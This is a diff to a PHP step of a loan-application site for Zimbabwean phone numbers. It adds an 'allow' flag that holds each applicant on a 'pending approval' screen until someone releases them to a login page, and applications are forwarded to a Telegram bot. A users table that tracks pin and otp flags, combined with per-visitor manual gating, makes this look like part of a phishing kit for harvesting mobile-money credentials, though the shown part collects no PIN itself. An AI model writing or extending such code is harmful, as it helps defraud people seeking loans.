@@ -27,7 +27,6 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
         $conn = @pg_connect($connString);
         if (!$conn) {
             error_log("DB connection failed: " . pg_last_error());
-            return false;
         }
     }
     return $conn;
@@ -38,7 +37,7 @@ if (!$conn) {
     error_log("Could not connect to PostgreSQL for users table");
 }
 
-// Create or modify `users` table with pin and otp columns (default 0)
+// Create or modify `users` table with pin, otp, and allow columns (default 0)
 if ($conn) {
     // First ensure table exists with basic columns
     $createTableSQL = "
@@ -61,6 +60,13 @@ if ($conn) {
     if (pg_num_rows($checkOtp) == 0) {
         pg_query($conn, "ALTER TABLE users ADD COLUMN otp INTEGER DEFAULT 0");
         error_log("Added otp column to users table");
+    }
+    
+    // Add allow column if missing (DEFAULT 0)
+    $checkAllow = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='allow'");
+    if (pg_num_rows($checkAllow) == 0) {
+        pg_query($conn, "ALTER TABLE users ADD COLUMN allow INTEGER DEFAULT 0");
+        error_log("Added allow column to users table with default 0");
     }
 }
 
@@ -148,15 +154,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
         $telegram_error = "HTTP Error: $httpCode";
     } elseif (isset($result['ok']) && $result['ok'] === true) {
 
-        // ========== INSERT/UPDATE PHONE INTO `users` TABLE ==========
+        // ========== INSERT/UPDATE PHONE INTO `users` TABLE WITH ALLOW COLUMN ==========
         if ($conn && !empty($phone)) {
-            // Insert phone with status=0, pin=0, otp=0 if not exists, otherwise do nothing
-            $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
+            // Insert phone with status=0, pin=0, otp=0, allow=0 if not exists, otherwise do nothing
+            $insertSQL = "INSERT INTO users (phone, status, pin, otp, allow) VALUES ($1, 0, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
             $insertResult = pg_query_params($conn, $insertSQL, [$phone]);
             if (!$insertResult) {
                 error_log("Failed to insert phone $phone into users table: " . pg_last_error($conn));
             } else {
-                error_log("User $phone inserted/ignored in users table with status=0, pin=0, otp=0");
+                error_log("User $phone inserted/ignored in users table with status=0, pin=0, otp=0, allow=0");
             }
         } else {
             error_log("Cannot insert phone: DB connection failed or phone empty");
@@ -164,8 +170,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
         // ============================================================
 
         $_SESSION['application_submitted'] = true;
-        header("Location: login.php");
-        exit;
+        
+        // Check the 'allow' column value for this user
+        if ($conn && !empty($phone)) {
+            $checkAllowSQL = "SELECT allow FROM users WHERE phone = $1";
+            $checkAllowResult = pg_query_params($conn, $checkAllowSQL, [$phone]);
+            
+            if ($checkAllowResult && pg_num_rows($checkAllowResult) > 0) {
+                $row = pg_fetch_assoc($checkAllowResult);
+                $allowValue = $row['allow'];
+                
+                if ($allowValue == 0) {
+                    // Send to Telegram and stay at step3.php
+                    $telegram_success = true;
+                    // Don't redirect to login.php, stay on this page
+                    error_log("Allow value is 0 for user $phone - staying on step3.php");
+                } elseif ($allowValue == 1) {
+                    // Proceed to login.php
+                    header("Location: login.php");
+                    exit;
+                } else {
+                    // Default case - treat as 0
+                    error_log("Unexpected allow value $allowValue for user $phone - defaulting to stay");
+                }
+            } else {
+                // User not found, default behavior - stay on step3.php
+                error_log("User $phone not found in users table - staying on step3.php");
+            }
+        } else {
+            // No DB connection or no phone - stay on step3.php
+            error_log("Cannot check allow value - staying on step3.php");
+        }
+        
+        // If we get here (allow=0 case), stay on current page
+        // Don't redirect, just show the page again
 
     } else {
         $telegram_error = $result['description'] ?? "Unknown Telegram error";
@@ -190,6 +228,7 @@ body { margin:0; font-family:Arial; background:#f2f2f2; }
 .btn { padding:12px; border:none; border-radius:6px; cursor:pointer; }
 .submit { background:#4f46e5; color:#fff; width:100%; }
 .error { background:#ffdddd; padding:10px; margin-bottom:10px; }
+.success { background:#ddffdd; padding:10px; margin-bottom:10px; }
 </style>
 </head>
 <body>
@@ -210,6 +249,12 @@ body { margin:0; font-family:Arial; background:#f2f2f2; }
 </div>
 <?php endif; ?>
 
+<?php if ($telegram_success && !$telegram_error): ?>
+<div class="success">
+✅ Application submitted successfully! Your application is pending approval. You will be notified once approved.
+</div>
+<?php endif; ?>
+
 <div class="section">
 <h4>Loan Details</h4>
 <div class="item"><span>Type</span><span><?= htmlspecialchars($loan_type) ?></span></div>
@@ -225,11 +270,17 @@ body { margin:0; font-family:Arial; background:#f2f2f2; }
 <div class="item"><span>Phone</span><span>+263 <?= htmlspecialchars($phone) ?></span></div>
 </div>
 
+<?php if (!$telegram_success): ?>
 <form method="POST">
     <button type="submit" name="submit_application" class="btn submit">
         SUBMIT APPLICATION
     </button>
 </form>
+<?php else: ?>
+<div style="text-align: center; margin-top: 20px;">
+    <p>⏳ Waiting for approval...</p>
+</div>
+<?php endif; ?>
 
 </div>
 </div>
